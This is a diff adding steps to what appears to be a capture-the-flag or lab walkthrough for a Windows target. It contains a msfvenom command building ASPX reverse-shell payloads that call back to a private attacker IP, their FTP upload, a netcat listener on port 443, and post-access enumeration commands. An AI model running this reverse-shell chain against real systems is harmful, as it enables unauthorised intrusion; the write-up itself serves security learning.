@@ -100,3 +100,34 @@ Win 32bits
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.228 LPORT=443 -f aspx -o win32.aspx
 ```
 ![image](https://github.com/user-attachments/assets/e91d426c-427f-44ce-b8c1-67f685f5f5cd)
+![image](https://github.com/user-attachments/assets/9836bb42-361c-42d0-be6b-95c46d9c0444)
+
+We will now upload our malicious files via ftp service
+```bash
+put win64.aspx
+put win32.aspx
+```
+![image](https://github.com/user-attachments/assets/64d2625c-224c-4c5f-95de-4206de836e34)
+
+we put ourselves in listening mode through port 443 that we configured in our malicious code and from the web we call our files waiting for a connection.
+
+```bash
+nc -nlvp 443
+```
+![image](https://github.com/user-attachments/assets/efc26a9b-fd32-4ac2-b3e1-8a3da1957847)
+![image](https://github.com/user-attachments/assets/d84867ea-3b47-4c19-b5b5-2bf44b92c01d)
+![image](https://github.com/user-attachments/assets/b19ac984-dd3f-4fb8-b752-76716226354e)
+![image](https://github.com/user-attachments/assets/23a10d09-1f99-495a-bf64-c07d0fc70a8b)
+
+```bash
+whoami
+systeminfo
+```
+![image](https://github.com/user-attachments/assets/33f56c3d-2715-41ac-9784-16838e9dd2b6)
+
+we are looking for possible vulnerabilities that would allow us to elevate privileges
+
+![image](https://github.com/user-attachments/assets/0acbfa09-e55f-4641-b24a-b9f0413c8039)
+![image](https://github.com/user-attachments/assets/ba2e0721-98c2-4add-bbdf-f65ad49a4f98)
+![image](https://github.com/user-attachments/assets/dd5af650-cea6-4d71-863f-4aec5c2e74fc)
+
